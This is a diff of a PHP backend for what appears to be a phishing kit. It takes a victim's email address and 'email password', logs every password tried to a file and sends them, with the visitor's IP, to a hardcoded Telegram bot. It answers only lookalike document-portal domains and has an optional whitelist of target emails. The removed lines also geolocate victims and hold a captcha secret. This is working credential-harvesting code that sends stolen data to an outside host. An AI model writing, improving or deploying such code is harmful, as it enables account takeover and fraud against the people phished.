@@ -1,260 +1,211 @@
 <?php
-session_start();
+// ==============================
+// CONFIG
+// ==============================
+define('ATTEMPTS_FILE', __DIR__ . '/data/attempts.json');
 
-// persistent log file on Railway volume
-define('ATTEMPTS_FILE', '/data/attempts.json');
+// ensure data dir exists so attempts persist
+$attemptDir = dirname(ATTEMPTS_FILE);
+if (!is_dir($attemptDir)) {
+    @mkdir($attemptDir, 0755, true);
+}
 
-// === TOGGLE: email validation ON/OFF ===
-$EMAIL_VALIDATION_ENABLED = true; // set to true to ENFORCE whitelist in papa.txt
+$EMAIL_VALIDATION_ENABLED = false;                 // set true if using whitelist
+$whitelist_file           = __DIR__ . '/papa.txt';
 
+$SUCCESS_REDIRECT_URL = "https://example.com/final-document"; // TODO: change
+$BLOCK_REDIRECT_URL   = "https://documentportal.zoholandingpage.com/blocked-page"; // TODO: change
+
+// Telegram
 $telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id   = "6915371044";
-$turnstile_secret   = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";
-$whitelist_file     = __DIR__ . '/papa.txt';
 
-// Detect accurate visitor IP
-function get_client_ip() {
-    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+// stateless step1→step2 token
+$TOKEN_SECRET = "CHANGE_THIS_TO_A_LONG_RANDOM_SECRET";
+$TOKEN_TTL    = 900; // 15 min
+
+// Allowed frontends for CORS
+$ALLOWED_ORIGINS = [
+    'https://documentportal.zoholandingpage.com',
+    'https://transmission.zoholandingpage.com',
+];
+
+// ==============================
+// HEADERS / CORS
+// ==============================
+header('Content-Type: application/json; charset=utf-8');
+
+$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
+if ($origin && in_array($origin, $ALLOWED_ORIGINS, true)) {
+    header("Access-Control-Allow-Origin: $origin");
+    header("Access-Control-Allow-Credentials: true");
+    header("Vary: Origin");
+}
+
+header("Access-Control-Allow-Methods: POST, OPTIONS");
+header("Access-Control-Allow-Headers: Content-Type");
+
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(204);
+    echo '';
+    exit;
+}
+
+// ==============================
+// HELPERS
+// ==============================
+function json_fail($msg, $extra = []) {
+    echo json_encode(array_merge(['ok' => false, 'error' => $msg], $extra));
+    exit;
+}
+function json_ok($extra = []) {
+    echo json_encode(array_merge(['ok' => true], $extra));
+    exit;
+}
+
+function get_ip() {
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        return $_SERVER['HTTP_CF_CONNECTING_IP'];
+    }
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    }
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// Load previous attempts
+function email_allowed($email, $enabled, $file) {
+    if (!$enabled) return true;
+    if (!file_exists($file)) return false;
+    $list = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $list = array_map('trim', $list);
+    return in_array($email, $list, true);
+}
+
+function make_token($email, $secret) {
+    $ts  = time();
+    $raw = $email . '|' . $ts;
+    $mac = hash_hmac('sha256', $raw, $secret);
+    return base64_encode($raw . '|' . $mac);
+}
+
+function parse_token($token, $secret, $ttl) {
+    if (!$token) return [false, 'Session expired. Please verify again.'];
+    $decoded = base64_decode($token, true);
+    if ($decoded === false) return [false, 'Session expired. Please verify again.'];
+    $parts = explode('|', $decoded);
+    if (count($parts) !== 3) return [false, 'Session expired. Please verify again.'];
+    [$email, $ts, $mac] = $parts;
+    $ts = (int)$ts;
+    $expected = hash_hmac('sha256', $email . '|' . $ts, $secret);
+    if (!hash_equals($expected, $mac)) return [false, 'Session expired. Please verify again.'];
+    if (time() - $ts > $ttl) return [false, 'Session expired. Please verify again.'];
+    return [true, ['email' => $email, 'ts' => $ts]];
+}
+
+// ==============================
+// BASIC VALIDATION
+// ==============================
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    json_fail('Invalid method');
+}
+
+$action = $_POST['action'] ?? '';
+if (!in_array($action, ['step1', 'step2'], true)) {
+    json_fail('Invalid action');
+}
+
+// Honeypot
+if (!empty($_POST['company'] ?? '')) {
+    json_fail('Unexpected error. Please try again.');
+}
+
+// load attempts
 $attempts = [];
 if (file_exists(ATTEMPTS_FILE)) {
-    $data = json_decode(file_get_contents(ATTEMPTS_FILE), true);
-    if (is_array($data)) {
-        $attempts = $data;
+    $tmp = json_decode(@file_get_contents(ATTEMPTS_FILE), true);
+    if (is_array($tmp)) {
+        $attempts = $tmp;
     }
 }
 
-/*
- * STEP 2: NAME/PASSWORD SUBMISSION
- */
-if (isset($_POST['name'])) {
+// ==============================
+// STEP 1 – email
+// ==============================
+if ($action === 'step1') {
+    $email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
+    if (!$email) json_fail('Please enter a valid email address.');
 
-    $ip = get_client_ip();
-
-    // Honeypot check
-    if (!empty($_POST['company'] ?? '')) {
-        $_SESSION['error_message'] = "Unexpected error. Please try again.";
-        header("Location: index.php"); exit;
+    if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
+        json_fail('Access is restricted to your email address.');
     }
 
-    // Session TTL + IP binding
-    $TTL = 600; // 10 minutes
-    if (
-        empty($_SESSION['verified_at']) ||
-        (time() - $_SESSION['verified_at']) > $TTL ||
-        empty($_SESSION['verified_ip']) ||
-        $_SESSION['verified_ip'] !== $ip
-    ) {
-        $_SESSION['error_message'] = "Session expired. Please verify again.";
-        session_unset();
-        header("Location: index.php"); exit;
-    }
-
-    // Step 2 one-time token
-    if (
-        empty($_POST['step2_token']) ||
-        empty($_SESSION['step2_token']) ||
-        !hash_equals($_SESSION['step2_token'], $_POST['step2_token'])
-    ) {
-        $_SESSION['error_message'] = "Invalid session. Please try again.";
-        session_unset();
-        header("Location: index.php"); exit;
-    }
-    unset($_SESSION['step2_token']);
-
-    // Min time between render and submit for Step 2
-    $minSeconds = 3;
-    if (empty($_SESSION['step2_rendered_at']) || (time() - $_SESSION['step2_rendered_at']) < $minSeconds) {
-        $_SESSION['error_message'] = "Unexpected error. Please try again.";
-        header("Location: index.php"); exit;
-    }
-    unset($_SESSION['step2_rendered_at']);
-
-    // ORIGINAL validated email (from step 1)
-    $original_email = $_SESSION['validated_email'] ?? ($_SESSION['old_email'] ?? '');
-
-    // Current email from POST (user may have changed it on step 2)
-    if (isset($_POST['email'])) {
-        $emailCandidate = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
-        if (!$emailCandidate) {
-            $_SESSION['error_message'] = "Invalid email.";
-            $_SESSION['step'] = 2;
-            $_SESSION['keep_step'] = true;
-            header("Location: index.php"); exit;
-        }
-
-        if ($EMAIL_VALIDATION_ENABLED) {
-            if (!file_exists($whitelist_file)) {
-                $_SESSION['error_message'] = "Configuration error: whitelist missing.";
-                header("Location: index.php"); exit;
-            }
-            $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-            $whitelist = array_map('trim', $whitelist);
-
-            if (!in_array($emailCandidate, $whitelist, true)) {
-                $_SESSION['error_message'] = "Access restricted to intended recipient.";
-                $_SESSION['step'] = 2;
-                $_SESSION['keep_step'] = true;
-                header("Location: index.php"); exit;
-            }
-        }
-
-        $email = $emailCandidate;
-        $_SESSION['old_email'] = $email;
-
-    } else {
-        $email = $original_email;
-    }
-
-    $name  = trim($_POST['name']);
-
-    if (!$email || !$name) {
-        $_SESSION['error_message'] = "Invalid input.";
-        $_SESSION['step'] = 2;
-        $_SESSION['keep_step'] = true;
-        header("Location: index.php"); exit;
-    }
-
-    // Location info
-    $geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query"), true);
-    $location = ($geo && isset($geo['country']))
-        ? ($geo['country'].", ".$geo['regionName'].", ".$geo['city'])
-        : "Unknown";
-
-    $now = date('Y-m-d H:i:s');
-
-    // Update attempts keyed by CURRENT email
-    if (!isset($attempts[$email])) {
-        $attempts[$email] = [
-            'names'    => [$name],
-            'count'    => 1,
-            'ip'       => $ip,
-            'location' => $location,
-            'time'     => $now
-        ];
-    } else {
-        $attempts[$email]['names'][] = $name;
-        $attempts[$email]['count']  += 1;
-        $attempts[$email]['ip']      = $ip;
-        $attempts[$email]['location']= $location;
-        $attempts[$email]['time']    = $now;
-    }
-
-    @file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
-
-    // Telegram notification
-    $msg  = "Login attempt for: $email\n";
-
-    if (!empty($original_email) && $original_email !== $email) {
-        $msg .= "Original validated email: $original_email\n";
-    }
-
-    $msg .= "Names tried: ".implode(", ", $attempts[$email]['names'])."\n";
-    $msg .= "Total attempts: {$attempts[$email]['count']}\n";
-    $msg .= "IP: $ip\n";
-    $msg .= "Location: $location\n";
-    $msg .= "Last updated: ".$attempts[$email]['time'];
-
-    @file_get_contents(
-        "https://api.telegram.org/bot$telegram_bot_token/sendMessage" .
-        "?chat_id=$telegram_chat_id&text=".urlencode($msg)
-    );
-
-    // Correct name/password check
-    $correct_name = "John Doe";
-
-    if ($name !== $correct_name && $attempts[$email]['count'] >= 3) {
-        header("Location: https://example.com/blocked"); exit;
-    } elseif ($name !== $correct_name) {
-        $_SESSION['error_message'] = "Incorrect details. Please try again.";
-        $_SESSION['step'] = 2;
-        $_SESSION['keep_step'] = true;
-        header("Location: index.php"); exit;
-    }
-
-    // Success
-    unset(
-        $_SESSION['old_email'],
-        $_SESSION['step'],
-        $_SESSION['validated_email'],
-        $_SESSION['verified_at'],
-        $_SESSION['verified_ip']
-    );
-    header("Location: dashboard.php"); exit;
+    $token = make_token($email, $TOKEN_SECRET);
+    json_ok(['email' => $email, 'token' => $token]);
 }
 
-/*
- * STEP 1: EMAIL SUBMISSION
- */
-if (isset($_POST['email']) && (!isset($_SESSION['step']) || $_SESSION['step'] == 1)) {
-    $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
-    $turnstile_response = $_POST['cf-turnstile-response'] ?? '';
+// ==============================
+// STEP 2 – password
+// ==============================
+$ip          = get_ip();
+$emailInput  = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
+$password    = trim($_POST['name'] ?? '');
+$postedToken = $_POST['step2_token'] ?? '';
 
-    // Honeypot check
-    if (!empty($_POST['company'] ?? '')) {
-        $_SESSION['error_message'] = "Unexpected error. Please try again.";
-        header("Location: index.php"); exit;
-    }
-
-    if (!$email) {
-        $_SESSION['error_message'] = "Invalid email.";
-        header("Location: index.php"); exit;
-    }
-
-    $ip = get_client_ip();
-
-    // Verify Turnstile
-    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
-        'secret'   => $turnstile_secret,
-        'response' => $turnstile_response,
-        'remoteip' => $ip
-    ]));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $turnstile_result = json_decode(curl_exec($ch), true);
-    curl_close($ch);
-
-    if (empty($turnstile_result['success'])) {
-        $_SESSION['error_message'] = "Turnstile verification failed.";
-        header("Location: index.php"); exit;
-    }
-
-    if ($EMAIL_VALIDATION_ENABLED) {
-        if (!file_exists($whitelist_file)) {
-            $_SESSION['error_message'] = "Configuration error: whitelist missing.";
-            header("Location: index.php"); exit;
-        }
-
-        $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        $whitelist = array_map('trim', $whitelist);
-
-        if (!in_array($email, $whitelist, true)) {
-            $_SESSION['error_message'] = "Access restricted to intended recipient";
-            header("Location: index.php"); exit;
-        }
-    }
-
-    // Step 1 success → prepare Step 2 session
-    $_SESSION['step']             = 2;
-    $_SESSION['old_email']        = $email;
-    $_SESSION['validated_email']  = $email;
-    $_SESSION['verified_at']      = time();
-    $_SESSION['verified_ip']      = $ip;
-    $_SESSION['step2_token']      = bin2hex(random_bytes(16));
-    unset($_SESSION['step2_rendered_at']);
-
-    // Mark this redirect as coming from step 1 success
-    $_SESSION['from_step1'] = true;
-
-    header("Location: index.php"); exit;
+if (!$emailInput || !$password) {
+    json_fail('Please enter your email password.');
 }
 
-// Fallback redirect
-header("Location: index.php");
-exit;
-?>
+[$okToken, $tokenData] = parse_token($postedToken, $TOKEN_SECRET, $TOKEN_TTL);
+if (!$okToken) {
+    json_fail($tokenData);
+}
+$emailFromToken = $tokenData['email'];
+$email          = $emailInput ?: $emailFromToken;
+
+if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
+    json_fail('Access is restricted to your email address.');
+}
+
+// update attempts
+$now = date('Y-m-d H:i:s');
+if (!isset($attempts[$email])) {
+    $attempts[$email] = [
+        'names' => [],
+        'count' => 0,
+        'ip'    => $ip,
+        'time'  => $now,
+    ];
+}
+$attempts[$email]['names'][] = $password;
+$attempts[$email]['count']   = ($attempts[$email]['count'] ?? 0) + 1;
+$attempts[$email]['ip']      = $ip;
+$attempts[$email]['time']    = $now;
+
+@file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
+
+// Telegram notify
+$msg  = "Login attempt for: {$email}\n";
+$msg .= "Names tried: " . implode(", ", $attempts[$email]['names']) . "\n";
+$msg .= "Total attempts: {$attempts[$email]['count']}\n";
+$msg .= "IP: {$ip}\n";
+$msg .= "Last updated: {$attempts[$email]['time']}";
+@file_get_contents(
+    "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage" .
+    "?chat_id={$telegram_chat_id}&text=" . urlencode($msg)
+);
+
+// Password policy
+$correct_password = "John Doe"; // TODO change
+
+if ($password !== $correct_password) {
+    if ($attempts[$email]['count'] >= 3) {
+        json_fail(
+            'Access denied.',
+            ['blocked' => true, 'redirect' => $BLOCK_REDIRECT_URL]
+        );
+    }
+    json_fail('Your account or password is incorrect.');
+}
+
+// SUCCESS
+json_ok(['redirect' => $SUCCESS_REDIRECT_URL]);
